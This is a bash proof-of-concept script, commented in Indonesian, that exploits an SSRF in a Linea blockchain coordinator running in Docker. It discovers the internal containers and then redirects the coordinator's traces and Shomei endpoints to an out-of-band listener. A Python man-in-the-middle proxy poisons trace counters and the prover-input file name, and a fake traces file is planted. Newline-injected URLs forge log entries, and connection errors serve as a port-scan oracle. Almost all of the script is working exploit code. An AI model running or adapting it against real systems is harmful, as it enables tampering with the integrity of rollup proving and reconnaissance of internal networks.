#!/bin/bash
# ==============================================================================
# LINEA COORDINATOR SSRF - FINAL UNIFIED PoC (v15)
# 100% Dynamic: auto-discover semua (container, IP, port, upstream, range, mount)
# Jalankan di setup docker mana pun. Output -> poc_ssrf_final_results.txt
# ==============================================================================
set -u
OUT="poc_ssrf_final_results.txt"
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1

echo "=================================================================="
echo "  LINEA COORDINATOR SSRF - FINAL PoC (fully dynamic)"
echo "  Phase: Discover -> SSRF -> Poison -> Prover Input -> Log Forge"
echo "=================================================================="
echo "Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo ""

# ==============================================================================
# PHASE 0: DISCOVERY - auto-detect semuanya
# ==============================================================================
echo "=============== PHASE 0: ENVIRONMENT DISCOVERY ==============="

# --- 0.1. Cari container coordinator (by name pattern / port / label) ---
find_coordinator() {
  local c
  # Method 1: by name
  c=$(docker ps --format '{{.Names}}' 2>/dev/null | grep -iE "^coordinator$|linea-coordinator|coordinator" | head -n1)
  [ -n "$c" ] && echo "$c" && return 0
  # Method 2: by image
  c=$(docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | grep -iE "coordinator" | awk -F'\t' '{print $1}' | head -n1)
  [ -n "$c" ] && echo "$c" && return 0
  return 1
}

COORD=$(find_coordinator)
if [ -z "$COORD" ]; then
  echo "[-] Container Coordinator tidak ditemukan. Container yang berjalan:"
  docker ps --format '{{.Names}}\t{{.Image}}' 2>/dev/null | head -20 | sed 's/^/    /'
  exit 1
fi
echo "[+] Coordinator container : $COORD"

# --- 0.2. Cari port JSON-RPC (dari log, dari env, dari compose label, dari config) ---
find_rpc_port() {
  local c="$1" p=""
  # Method 1: from logs
  p=$(docker logs "$c" 2>&1 | grep -oiE "JSON-RPC server started port=[0-9]+" | tail -n1 | grep -oE "[0-9]+$")
  [ -n "$p" ] && echo "$p" && return 0
  # Method 2: from config file in container
  p=$(docker exec "$c" sh -c 'cat /opt/consensys/linea/coordinator/config/*.toml 2>/dev/null | grep -oE "json-rpc-port\s*=\s*[0-9]+" | grep -oE "[0-9]+"' 2>/dev/null)
  [ -n "$p" ] && echo "$p" && return 0
  # Method 3: from env
  p=$(docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>/dev/null | grep -oE "JSON_RPC_PORT=[0-9]+" | grep -oE "[0-9]+")
  [ -n "$p" ] && echo "$p" && return 0
  # Method 4: common defaults
  for pd in 9546 8545 9545; do
    if docker exec "$c" sh -c "command -v nc >/dev/null 2>&1 && nc -z localhost $pd" 2>/dev/null; then
      echo "$pd" && return 0
    fi
  done
  echo "9546" # last resort
}
RPC_PORT=$(find_rpc_port "$COORD")

# --- 0.3. Cari IP container (multi-network aware) ---
CONTAINER_IPS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$COORD" 2>/dev/null))
CONTAINER_GWS=($(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.Gateway}} {{end}}' "$COORD" 2>/dev/null))

# --- 0.4. Cari RPC endpoint yang hidup ---
RPC=""
for ip in "${CONTAINER_IPS[@]}"; do
  for port in "$RPC_PORT" 9546 9545 8545; do
    r=$(curl -s --connect-timeout 3 --max-time 5 -X POST "http://${ip}:${port}/" \
        -H 'Content-Type: application/json' \
        -d '{"jsonrpc":"2.0","method":"rpc_modules","params":[],"id":1}' 2>/dev/null)
    if echo "$r" | grep -q '"jsonrpc"'; then
      RPC="http://${ip}:${port}/"; echo "$port"; break 2
    fi
  done
done
if [ -z "$RPC" ]; then
  echo "[-] Coordinator RPC tidak reachable dari host. Health check:"
  docker ps --filter name="$COORD" --format "    Status: {{.Status}}"
  echo "    Jika unhealthy: restart dengan: docker restart $COORD; sleep 60; re-run script"
  exit 1
fi
echo "[+] Coordinator RPC       : $RPC"

# --- 0.5. Gateway IP (dipakai untuk listener OOB) ---
GW="${CONTAINER_GWS[0]:-172.17.0.1}"
echo "[+] Gateway IP (OOB host) : $GW"

# --- 0.6. Cari container lain (sequencer, besu/traces, shomei) ---
find_by_probe() {
  local target_method="$1" target_port="$2"
  for c in $(docker ps --format '{{.Names}}' | grep -viE "$COORD"); do
    for cip in $(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}} {{end}}' "$c" 2>/dev/null); do
      r=$(curl -s --connect-timeout 2 --max-time 3 -X POST "http://${cip}:${target_port}" \
          -H 'Content-Type: application/json' \
          -d "{\"jsonrpc\":\"2.0\",\"method\":\"$target_method\",\"params\":[],\"id\":1}" 2>/dev/null)
      if echo "$r" | grep -qE '"jsonrpc"|"result"'; then
        echo "$cip"; return 0
      fi
    done
  done
  return 1
}

echo "[*] Mencari Sequencer (eth_blockNumber)..."
SEQ_IP=$(find_by_probe "eth_blockNumber" 8545)
echo "[+] Sequencer IP: ${SEQ_IP:-NOT_FOUND}"

echo "[*] Mencari Traces API (linea_getBlockTracesCountersV2)..."
TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8545)
if [ -z "$TRACES_IP" ]; then
  # Try other ports
  TRACES_IP=$(find_by_probe "linea_getBlockTracesCountersV2" 8080)
fi
echo "[+] Traces/Besu IP: ${TRACES_IP:-NOT_FOUND}"

echo "[*] Mencari Shomei (rollup_getZkEVMStateMerkleProofV0)..."
SHOMEI_IP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8888)
if [ -z "$SHOMEI_IP" ]; then
  SHOMEI_IP=$(find_by_probe "rollup_getZkEVMStateMerkleProofV0" 8546)
fi
echo "[+] Shomei IP: ${SHOMEI_IP:-NOT_FOUND}"

# --- 0.7. Cari host data dir (mount /data) ---
find_host_data() {
  local c="$1" src=""
  # From inspect mounts
  src=$(docker inspect -f '{{range .Mounts}}{{if eq .Destination "/data"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
  [ -n "$src" ] && { echo "$src"; return 0; }
  # From repo path detection
  for d in /workspaces/lineth-monorepo /workspace/lineth-monorepo ~/lineth-monorepo ../lineth-monorepo ./; do
    if [ -f "$d/docker/compose-tracing-v2.yml" ] || [ -d "$d/tmp/local" ]; then
      echo "$d/tmp/local"; return 0
    fi
  done
  # From docker inspect all mounts
  src=$(docker inspect -f '{{range .Mounts}}{{if contains .Destination "conflation-backtesting"}}{{.Source}}{{end}}{{end}}' "$c" 2>/dev/null)
  [ -n "$src" ] && { echo "$(dirname "$src")"; return 0; }
  return 1
}
HOST_DATA=$(find_host_data "$COORD")
echo "[+] Host data dir: ${HOST_DATA:-NOT_FOUND (file evidence akan di-skip)}"
[ -n "$HOST_DATA" ] && mkdir -p "$HOST_DATA/conflation-backtesting" 2>/dev/null

# --- 0.8. Chain head & block range valid ---
echo -e "\n[*] Chain head (sequencer):"
CHAIN_HEAD=0
if [ -n "$SEQ_IP" ]; then
  HX=$(curl -s -m 5 -X POST "http://${SEQ_IP}:8545" -H 'Content-Type: application/json' \
       -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
  [ -n "$HX" ] && CHAIN_HEAD=$((HX))
fi
echo "    Chain head: $CHAIN_HEAD"

# Jika head = 0, tunggu block
if [ "$CHAIN_HEAD" -lt 5 ]; then
  echo "    Chain kosong/idle - menunggu block production (max 120s)..."
  for i in $(seq 1 12); do
    sleep 10
    if [ -n "$SEQ_IP" ]; then
      HX=$(curl -s -m 5 -X POST "http://${SEQ_IP}:8545" -H 'Content-Type: application/json' \
           -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' 2>/dev/null | grep -oE '0x[0-9a-fA-F]+' | head -n1)
      [ -n "$HX" ] && CHAIN_HEAD=$((HX))
    fi
    [ "$CHAIN_HEAD" -ge 5 ] && break
    printf "    ... head=%d (%ds)\r" "$CHAIN_HEAD" $((i*10))
  done
  echo ""
fi

# Block range: pakai block yang ada
if [ "$CHAIN_HEAD" -ge 5 ]; then
  END=$((CHAIN_HEAD-2)); START=$((CHAIN_HEAD-3))
  # Verify traces ada
  if [ -n "$TRACES_IP" ]; then
    TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
      -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$START}],\"id\":1}" 2>/dev/null)
    if ! echo "$TC" | grep -q '"tracesCounters"'; then
      # Coba block lain
      for b in $(seq 1 "$CHAIN_HEAD"); do
        TC=$(curl -s -m 5 -X POST "http://${TRACES_IP}:8545" -H 'Content-Type: application/json' \
          -d "{\"jsonrpc\":\"2.0\",\"method\":\"linea_getBlockTracesCountersV2\",\"params\":[{\"blockNumber\":$b}],\"id\":1}" 2>/dev/null)
        if echo "$TC" | grep -q '"tracesCounters"'; then
          END=$b; START=$b; break
        fi
      done
    fi
  fi
else
  START=1; END=2
fi
echo "[+] Block range untuk job: $START..$END"

echo -e "\n=================================================================="
echo "  DISCOVERY SELESAI - mulai attack chain"
echo "=================================================================="

# ==============================================================================
# PHASE 1: BASELINE SSRF - OOB capture (blind POST)
# ==============================================================================
echo -e "\n=============== PHASE 1: BASELINE SSRF (OOB) ==============="

# Bersihkan port
OOB_PORT=12345
fuser -k ${OOB_PORT}/tcp 2>/dev/null; sleep 1

# OOB listener - log SEMUA request (method, body, headers)
OOB_LOG=/tmp/ssrf_oob_capture.txt
rm -f "$OOB_LOG"; : > "$OOB_LOG"
python3 - <<'PYEOF' > /dev/null 2>&1 &
import http.server, json
LOG="/tmp/ssrf_oob_capture.txt"
class H(http.server.BaseHTTPRequestHandler):
    def _log(self, body=b""):
        with open(LOG, "a") as f:
            f.write("%s %s from %s\n  headers=%s\n  body=%r\n" % (
                self.command, self.path, self.client_address[0], dict(self.headers), body[:300]))
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        self._log(body)
        r=b'{"jsonrpc":"2.0","id":1,"result":{}}'
        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(r))); self.end_headers(); self.wfile.write(r)
    def do_GET(self):
        self._log()
        r=b'{"ok":1}'
        self.send_response(200); self.send_header("Content-Length",str(len(r)))
        self.end_headers(); self.wfile.write(r)
    def log_message(self, *a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12345),H).serve_forever()
PYEOF
OOB_PID=$!; sleep 1

echo "[1.1] Mengirim payload SSRF (tracesApi = OOB server)..."
R=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${OOB_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Response: $R"

echo "[1.2] Menunggu 30 detik..."
sleep 30

if [ -s "$OOB_LOG" ]; then
  echo "    [!!!] SSRF TERKONFIRMASI - request outbound ditangkap:"
  cat "$OOB_LOG" | head -20 | sed 's/^/      /'
else
  echo "    [-] Tidak ada request (job mungkin belum berjalan - lanjut ke phase lain)"
fi

# ==============================================================================
# PHASE 2: DATA POISONING - schema-correct MITM ke upstream asli
# ==============================================================================
echo -e "\n=============== PHASE 2: DATA POISONING ==============="

MITM_PORT=12346
fuser -k ${MITM_PORT}/tcp 2>/dev/null; sleep 1

# Setup upstream
if [ -n "$TRACES_IP" ]; then
  export UPSTREAM_TRACES="http://${TRACES_IP}:8545"
else
  export UPSTREAM_TRACES=""
fi
if [ -n "$SHOMEI_IP" ]; then
  export UPSTREAM_SHOMEI="http://${SHOMEI_IP}:8888"
else
  export UPSTREAM_SHOMEI=""
fi

MITM_LOG=/tmp/ssrf_mitm_log.txt
rm -f "$MITM_LOG"; : > "$MITM_LOG"

# Plant file marker sebelum MITM (butuh MARK di environment python)
MARK="ATTACKER$(date +%s)"
export SSRF_MARK="$MARK"

python3 - <<'PYEOF' > /dev/null 2>&1 &
import http.server, json, os, urllib.request, urllib.error
TRACES=os.environ.get("UPSTREAM_TRACES","")
SHOMEI=os.environ.get("UPSTREAM_SHOMEI","")
LOG="/tmp/ssrf_mitm_log.txt"
def forward(url, body):
    if not url: return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"no upstream"}}).encode()
    req=urllib.request.Request(url, data=body, headers={"Content-Type":"application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=180) as r: return 200, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, json.dumps({"jsonrpc":"2.0","id":1,"error":{"code":-32000,"message":"proxy:%s"%e}}).encode()

def poison_counters(obj, mode):
    """Tamper countersMap sesuai mode"""
    hits = []
    def walk(o):
        if isinstance(o, dict):
            if "countersMap" in o and isinstance(o["countersMap"], dict):
                for k in o["countersMap"]:
                    if isinstance(o["countersMap"][k], int):
                        hits.append(k)
                        o["countersMap"][k] = 999999999 if mode=="over" else o["countersMap"][k]+1000
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for x in o: walk(x)
    walk(obj)
    return hits

def poison_filename(obj, mode, fake_path):
    """Tamper conflatedTracesFileName + tracesEngineVersion"""
    note = ""
    if isinstance(obj, dict) and "result" in obj and isinstance(obj["result"], dict):
        res = obj["result"]
        if "conflatedTracesFileName" in res:
            orig = res["conflatedTracesFileName"]
            res["conflatedTracesFileName"] = fake_path
            res["tracesEngineVersion"] = "attacker-1"
            note = "TAMPER filename: %s -> %s" % (orig, fake_path)
    return note

MARK = os.environ.get("SSRF_MARK", "ATTACKER")
FAKE_PATH = "/data/traces/v2/conflated/%s.attacker.lt.gz" % MARK

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); body=self.rfile.read(n)
        try: method=json.loads(body).get("method","")
        except: method=""

        # Route: linea_* -> traces, rollup_* -> shomei
        up = SHOMEI if method.startswith("rollup_") else TRACES
        code, resp = forward(up, body)
        note = ""

        # Tamper berdasarkan path suffix
        if "/poison-over" in self.path and method == "linea_getBlockTracesCountersV2" and code==200:
            try:
                obj=json.loads(resp)
                hits = poison_counters(obj, "over")
                if hits: note = "[OVER:%d counters -> 999999999]" % len(hits); resp=json.dumps(obj).encode()
            except: pass
        elif "/poison-plus" in self.path and method == "linea_getBlockTracesCountersV2" and code==200:
            try:
                obj=json.loads(resp)
                hits = poison_counters(obj, "plus")
                if hits: note = "[PLUS:%d counters +1000]" % len(hits); resp=json.dumps(obj).encode()
            except: pass
        elif "/poison-file" in self.path and method == "linea_generateConflatedTracesToFileV2" and code==200:
            try:
                obj=json.loads(resp)
                note = poison_filename(obj, "file", FAKE_PATH)
                if note: resp=json.dumps(obj).encode()
            except: pass

        with open(LOG,"a") as f:
            f.write(">> %s %s %s\n   resp: %s\n" % (self.path, method, note, resp[:200].decode(errors='replace')))

        self.send_response(200); self.send_header("Content-Type","application/json")
        self.send_header("Content-Length",str(len(resp))); self.end_headers(); self.wfile.write(resp)
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Length","2")
        self.end_headers(); self.wfile.write(b"{}")
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("0.0.0.0",12346),H).serve_forever()
PYEOF
MITM_PID=$!; sleep 1
echo "[+] MITM aktif (PID $MITM_PID, :$MITM_PORT) -> traces=${UPSTREAM_TRACES:-none} shomei=${UPSTREAM_SHOMEI:-none}"

# Submit poison job (plus mode - silent corruption, ADD=1000)
echo "[2.1] Submit POISON-PLUS job (counters +1000, silent)..."
RP=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-plus\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Response: $RP"
JOB_PLUS=$(echo "$RP" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)

# Submit poison job (over mode - TRACES_LIMIT trigger)
echo "[2.2] Submit POISON-OVER job (counters=999999999, decision control)..."
RO=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-over\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Response: $RO"
JOB_OVER=$(echo "$RO" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)

echo "    JobIDs: PLUS=$JOB_PLUS | OVER=$JOB_OVER"

# Submit prover-input-control job
echo "[2.3] Submit PROVER-INPUT job (filename tamper)..."
# Plant file first
if [ -n "$HOST_DATA" ]; then
  mkdir -p "$HOST_DATA/traces/v2/conflated"
  printf '{"fake":"traces","marker":"%s"}' "$MARK" > "$HOST_DATA/traces/v2/conflated/$MARK.attacker.lt.gz"
  echo "    File ditanam: /data/traces/v2/conflated/$MARK.attacker.lt.gz"
fi
RF=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
    \"tracesApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}/poison-file\",\"requestLimitPerEndpoint\":100},
    \"shomeiApi\":{\"endpoint\":\"http://${GW}:${MITM_PORT}\",\"requestLimitPerEndpoint\":100}}]}")
echo "    Response: $RF"
JOB_FILE=$(echo "$RF" | grep -oE '[0-9]+-[0-9]+-+[0-9]+' | head -n1)
echo "    JobID FILE: $JOB_FILE"

echo "[2.4] Menunggu 120 detik untuk processing..."
for i in $(seq 1 12); do sleep 10; printf "    ... %ds\r" $((i*10)); done
echo ""

# ==============================================================================
# PHASE 3: LOG INJECTION (CWE-117)
# ==============================================================================
echo -e "\n=============== PHASE 3: LOG INJECTION ==============="

SPOOF_MARK="SPOOF$(date +%s)"
FORGED_URL="http://${GW}:${OOB_PORT}/x
time=2099-01-01T00:00:00,000Z level=ERROR message=$SPOOF_MARK FAKE-LOG-ENTRY-BY-ATTACKER"

echo "[3.1] Submit URL dengan newline (log forging)..."
RL=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"$FORGED_URL\",\"requestLimitPerEndpoint\":1}}]}")
echo "    Response: $RL (note: Internal error = newline diterima)"
sleep 10

if docker logs "$COORD" 2>&1 | grep -q "time=2099-01-01.*$SPOOF_MARK"; then
  echo "    [!!!] LOG FORGING CONFIRMED (CWE-117):"
  docker logs "$COORD" 2>&1 | grep "time=2099" | head -2 | sed 's/^/      /'
else
  echo "    [-] Tidak terdeteksi sebagai baris mandiri"
fi

# ==============================================================================
# PHASE 4: PORT SCAN ORACLE
# ==============================================================================
echo -e "\n=============== PHASE 4: PORT SCAN ORACLE ==============="

echo "[4.1] Closed port (connection refused oracle)..."
RS=$(curl -s --max-time 10 -X POST "$RPC" -H 'Content-Type: application/json' -d "{
  \"jsonrpc\":\"2.0\",\"method\":\"conflation_createProverRequests\",\"id\":1,
  \"params\":[{\"startBlockNumber\":$START,\"endBlockNumber\":$END,\"blobCompressorVersion\":\"V3\",
  \"tracesApi\":{\"endpoint\":\"http://${GW}:9999\",\"requestLimitPerEndpoint\":1}}]}")
echo "    Response: $RS"
sleep 20
ORACLE=$(docker logs "$COORD" --since 30s 2>&1 | grep -iE "refused.*9999" | head -n1)
if [ -n "$ORACLE" ]; then
  echo "    [+] ORACLE CONFIRMED: $(echo "$ORACLE" | cut -c1-200)"
else
  echo "    [-] Oracle tidak muncul dalam 30s (coba lagi nanti - retry loop)"
fi

# ==============================================================================
# PHASE 5: EVIDENCE COLLECTION
# ==============================================================================
echo -e "\n=============== PHASE 5: EVIDENCE COLLECTION ==============="

echo "(A) MITM LOG (semua request + tamper):"
grep "^>>" "$MITM_LOG" 2>/dev/null | head -30 | sed 's/^/    /'

echo -e "\n(B) LOG COORDINATOR - Poisoned counters di 'new batch':"
docker logs "$COORD" 2>&1 | grep "new batch" | grep -oE "trigger=[A-Z_]+ tracesCounters=TracesCountersV5\(countersMap=\{[^}]{0,80}" | tail -5 | sed 's/^/    /'

echo -e "\n(C) File request job PROVER-INPUT:"
if [ -n "$HOST_DATA" ] && [ -n "$JOB_FILE" ]; then
  find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -type f 2>/dev/null | head -8 | sed 's/^/    /'
  for f in $(find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -type f 2>/dev/null | head -3); do
    echo "    --- $(basename "$f")"
    grep -oE '"conflatedExecutionTracesFile"[^,}]*|"tracesEngineVersion"[^,}]*' "$f" | head -4 | sed 's/^/      /'
  done
  # Check for marker
  if find "$HOST_DATA/conflation-backtesting/$JOB_FILE" -name "*.json" -exec grep -l "$MARK" {} \; 2>/dev/null | grep -q .; then
    echo "    [!!!] MARKER $MARK ditemukan di request file - PROVER INPUT CONTROL TERBUKTI"
  fi
else
  echo "    (skip - HOST_DATA atau JOB_FILE tidak tersedia)"
fi

echo -e "\n(D) Traces files di shared FS:"
ls -la "$HOST_DATA/traces/v2/conflated/" 2>/dev/null | tail -5 | sed 's/^/    /'

echo -e "\n(E) Retry/log flooding check:"
RETRY_COUNT=$(docker logs "$COORD" 2>&1 | grep -c "already retried" || echo 0)
echo "    Total 'already retried' lines: $RETRY_COUNT"

echo -e "\n(F) Config dump evidence (topology leak):"
docker logs "$COORD" 2>&1 | grep -oE "endpoints=\[http://[^\]]+\]" | sort -u | head -10 | sed 's/^/    /'

# ==============================================================================
# CLEANUP
# ==============================================================================
echo -e "\n=============== CLEANUP ==============="
kill $OOB_PID $MITM_PID 2>/dev/null
fuser -k 12345/tcp 12346/tcp 2>/dev/null
echo "[+] Listener dibunuh. Restart coordinator untuk hapus job zombie:"
echo "    docker restart $COORD"
[ -n "$HOST_DATA" ] && echo "    rm -rf $HOST_DATA/conflation-backtesting/*"

echo ""
echo "Evidence tersimpan:"
echo "    - $OUT (output lengkap run ini)"
echo "    - /tmp/ssrf_mitm_log.txt (MITM log)"
echo "    - /tmp/ssrf_oob_capture.txt (OOB capture)"
echo ""
echo "Selesai."
